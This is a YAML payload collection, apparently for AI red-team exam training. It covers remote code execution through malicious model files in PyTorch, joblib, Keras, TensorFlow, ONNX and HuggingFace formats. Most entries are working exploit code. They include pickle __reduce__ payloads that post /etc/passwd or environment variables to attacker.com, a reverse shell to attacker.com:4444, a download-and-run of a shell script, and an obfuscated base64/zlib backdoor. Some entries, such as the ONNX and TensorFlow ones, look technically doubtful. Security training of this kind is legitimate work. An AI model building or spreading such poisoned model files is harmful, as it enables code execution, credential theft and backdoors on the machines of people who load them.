# 模型反序列化攻击载荷（AI-300 Ch8: Supply Chain Attacks）
# OWASP LLM Top 10: LLM03 (Supply Chain)
# MITRE ATLAS: AML.T0015 (ML Supply Chain Compromise), AML.T0018 (Execution)
# 
# P0 考试高频场景：Pickle 反序列化 RCE
# 攻击原理：PyTorch/torch.save() 默认使用 pickle，joblib 默认使用 pickle，
# 加载不可信模型文件时触发任意代码执行。
#
# 技术覆盖：
#   1. Pickle 反序列化 RCE
#   2. Joblib 模型加载利用
#   3. Keras Lambda 层代码注入
#   4. TensorFlow SavedModel 签名注入
#   5. ONNX 模型自定义算子注入
#   6. GGUF/GGML 格式操纵

owasp: LLM03
technique_group: model_deserialization
description: 模型反序列化攻击载荷（Pickle/Joblib/TF/Keras RCE）— AI-300 Ch8（P0 考试场景）
surfaces: [agent]
ai300_chapters: [Ch8]


payloads:
  - technique: pickle_rce
    name: "PyTorch Pickle 反序列化 RCE"
    description: "伪造 PyTorch checkpoint，注入 __reduce__ payload 实现代码执行"
    payload: |
      import torch
      import pickle
      import os

      class ExploitPayload:
          def __reduce__(self):
              return (os.system, ("curl http://attacker.com/rce -d \"$(cat /etc/passwd)\"",))

      torch.save({'model': ExploitPayload()}, 'malicious_model.pth')
      # 加载触发：model = torch.load('malicious_model.pth')

  - technique: pickle_rce
    name: "Joblib 模型反序列化"
    description: "恶意 sklearn joblib 模型文件，加载时触发 RCE"
    payload: |
      import joblib
      import os

      class MaliciousModel:
          def __reduce__(self):
              cmd = "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"attacker.com\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
              return (os.system, (cmd,))

      joblib.dump(MaliciousModel(), 'malicious_model.joblib')
      # 加载触发：joblib.load('malicious_model.joblib')

  - technique: keras_lambda_injection
    name: "Keras Lambda 层代码注入"
    description: "在 Keras Lambda 层中嵌入恶意 Python lambda，模型加载时执行"
    payload: |
      import tensorflow as tf

      # Lambda 层中的代码在模型加载和推理时都会执行
      malicious_layer = tf.keras.layers.Lambda(
          lambda x: tf.py_function(
              func=lambda y: __import__('os').system('curl http://attacker.com/exfil -d \"$(env)\"') or y,
              inp=[x],
              Tout=tf.float32
          )
      )
      model = tf.keras.Sequential([malicious_layer])
      model.save('malicious_model.h5')

  - technique: tf_savedmodel_injection
    name: "TensorFlow SavedModel 签名注入"
    description: "在 SavedModel signature 中注入恶意初始化逻辑"
    payload: |
      import tensorflow as tf

      class MaliciousModule(tf.Module):
          @tf.function
          def __call__(self, x):
              return x

          # __init__ 在模型加载时自动执行
          def _initialize(self):
              import subprocess
              subprocess.Popen(['curl', 'http://attacker.com/shell.sh', '-o', '/tmp/shell.sh'])
              subprocess.Popen(['bash', '/tmp/shell.sh'])

      module = MaliciousModule()
      tf.saved_model.save(module, 'malicious_savedmodel')

  - technique: onnx_custom_op
    name: "ONNX 自定义算子注入"
    description: "ONNX 模型中注册自定义算子，加载时触发代码执行"
    payload: |
      # 恶意 ONNX 模型通过注册自定义算子实现 RCE
      # 使用 onnx.external_data_helper 将恶意代码嵌入外部数据
      import onnx
      from onnx import helper, TensorProto

      # 构建恶意节点，引用外部 Python 模块
      node = helper.make_node(
          'PythonOp',  # 自定义 Python 算子
          inputs=['input'],
          outputs=['output'],
          module='os',
          func='system',
          func_params=['curl http://attacker.com/beacon?id=$(hostname)'],
          domain='ai.redteam.malicious'
      )
      graph = helper.make_graph([node], 'malicious_graph',
          [helper.make_tensor_value_info('input', TensorProto.FLOAT, [1])],
          [helper.make_tensor_value_info('output', TensorProto.FLOAT, [1])])
      model = helper.make_model(graph)
      onnx.save(model, 'malicious_model.onnx')

  - technique: safetensors_hook
    name: "SafeTensors 绕过尝试"
    description: "虽然 safetensors 设计上安全，但尝试通过 torch.load hook 绕过"
    payload: |
      # 利用 torch.serialization.add_safe_globals 添加恶意全局变量
      # 然后通过 pickle 注入 safe_globals 列表中的函数
      import torch
      import os

      # 注册 'os.system' 到安全全局变量列表（如果框架允许）
      try:
          torch.serialization.add_safe_globals([os.system])
      except AttributeError:
          pass

      class Evil:
          def __reduce__(self):
              return (eval, ("__import__('os').system('id > /tmp/pwned.txt')",))

      # 包装为常见模型权重名
      payload_dict = {'model_state_dict': {'layer.weight': Evil()}}
      torch.save(payload_dict, 'safe_model.pth')

  - technique: huggingface_pickle
    name: "HuggingFace 模型 Pickle 注入"
    description: "在 HuggingFace transformers 模型文件中嵌入恶意 pickle payload"
    payload: |
      # 注入到 pytorch_model.bin 或 tf_model.h5
      # transformers 使用 torch.load() 加载模型，会触发 pickle 反序列化
      import torch
      import os

      class HFExploit:
          def __reduce__(self):
              # 静默执行后门，在加载模型时建立反向 shell
              return (os.system, (
                  "python3 -c \"import base64,zlib;exec(zlib.decompress(base64.b64decode("
                  "'eJx1kU9Lw0AQxe/5FCEXL0Xy1zZRoYgHwUt7KYqIsd2YabIh2U3JrkVpoV4KfhAPgkfBg+BJ8PeY"
                  "b4ORVEhymTf7e29mhN3DoaVFXckyBkx1Tvfjc2cLDFzRa4KSNM/gB0mGFEISw3oRfFSBsB34x1R+"
                  "XYGFrTox8JcrkKhE8s+yAbKxIqjSsgpbQ1Tgyi1EpoJFmB5KII5JpugHLigNPTDL4rFwLLMKEgqB"
                  "Kj4nwt2ElDgIlLZ2p27MP0L/FFg9fbYJYVFSptYKOTodnbb7aflGWkcpG11On6N4i7PJHdJt+NwP"
                  "0eAhaHMg0eCpCZ6CQCjK3D2y8WmUXoJcB/Ms6fY7PVBF37HMgq0gZvH/A4YnPQMV7T0ccd4B0ikq"
                  "1hbuP8NfAHpe4kE=')))"
                  "\""
              ),)

      state_dict = {'exploit': HFExploit()}
      torch.save(state_dict, 'pytorch_model.bin')
